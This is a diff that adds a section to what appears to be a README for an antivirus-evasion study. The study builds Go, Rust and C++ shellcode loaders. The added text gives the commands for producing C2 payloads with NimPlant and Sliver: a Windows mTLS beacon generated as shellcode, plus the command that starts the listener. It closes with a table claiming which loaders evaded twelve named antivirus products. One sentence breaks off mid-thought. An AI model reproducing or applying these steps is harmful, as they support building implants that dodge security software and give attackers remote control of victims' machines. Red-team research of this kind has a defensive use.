@@ -73,6 +73,41 @@ head -c 90M </dev/urandom > file-2
 ```
 With "file-2" the name of the output file, and "90M" is the file size. You can generate and include as many files as you like.
 
+Also, Rust code requests a binary file to load into the process, while Go code loads a simple shellcode. So, to export such a file from Nimplant, execute:
+```
+python NimPlant.py compile
+```
+While, to generate such a file from Sliver, execute:
+```
+generate beacon --mtls IP --os windows --disable-sgn -f shellcode --skip-symbols --timeout 10
+```
+And start the "mtls" listener, by executing:
+```
+mtls
+```
+
+## Receiving connection
+To be able to capture the response of these executables, I used two C2 servers, namely Sliver, and Nimplant. Along with Metasploit, which was used for . 
+
+## AV Evasion
+The following table refers to the executables with the best evasion rate from the study. This means that all these three executables had included randomly generated files, use the provided code, and for the Rust code, implemented both loaders.
+
+|  AV | Go | Rust | C++ |
+|---|---|---|---|
+|Avast|✗|  ✓ |  ✗ |
+|AVG |  ✗ |  ✓ |  ✗ |
+|  Avira|  ✓ | ✓  |  ✓ |
+|  MS Defender |  ✓ | ✓  | ✓  |
+|  Webroot | ✓  |  ✓ | ✓ |
+|  Eset |  ✗ |  ✓ |  ✓ |
+|  BitDefender |  ✗ | ✓  | ✓ |
+| Kaspersky |  ✓ |✓   |✗ |
+| Sophos |  ✓ |  ✓ | ✓ |
+| MalwareBytes |  ✓ |  ✓ | ✓ | 
+| McAfee |  ✓ | ✓  | ✓  |
+| Norton |  ✓ | ✓  |  ✓ |
+| Results| 8/12| 12/12| 9/12|
+
 <!-- CONTRIBUTING -->
 ## Contributing
 
